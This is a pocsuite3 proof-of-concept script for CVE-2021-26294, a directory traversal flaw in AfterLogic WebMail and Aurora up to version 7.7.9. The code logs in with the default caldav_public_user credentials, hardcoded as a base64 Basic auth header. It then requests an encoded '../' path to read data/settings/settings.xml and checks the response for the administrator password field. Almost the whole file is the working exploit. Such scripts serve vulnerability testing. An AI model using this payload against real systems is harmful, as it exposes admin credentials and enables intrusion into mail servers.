from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
class DemoPOC(POCBase):
    vulID = 'CVE-2021-26294'  # ssvid
    version = '1.0'
    name = 'AfterLogic WebMail 目录遍历漏洞'
    appName = 'AfterLogic'
    appVersion = '<=7.7.9'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''在 AfterLogic Aurora(版本<=7.7.9) 和 AfterLogic WebMail Pro(<=7.7.9)中发现了一个问题。它们允许目录遍历以读取文件（例如读取包含管理面板凭据的 data/settings/settings.xml 文件），在使用 caldav_public_user 帐户（使用 caldav_public_user作为其密码）时可以通过发送如 dav/server.php/files/personal/%2e%2e的链接来证明该漏洞 。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):#验证模式
        result = {}
        headers = {
            'Authorization': 'Basic Y2FsZGF2X3B1YmxpY191c2VyQGxvY2FsaG9zdDpjYWxkYXZfcHVibGljX3VzZXI=',
            'Accept': '*/*',
            'Connection': 'close',
        }
        try:
            target = self.url+"/dav/server.php/files/personal/%2e%2e/%2e%2e//%2e%2e//%2e%2e/data/settings/settings.xml"
            r = requests.get(url=target,timeout=5,verify=False,headers=headers)
            if  "AdminPassword" in r.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target
                result['VerifyInfo']['payload'] = "/dav/server.php/files/personal/%2e%2e/%2e%2e//%2e%2e//%2e%2e/data/settings/settings.xml"
                return self.parse_output(result)
        except Exception as e:
            print(e)
            pass

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)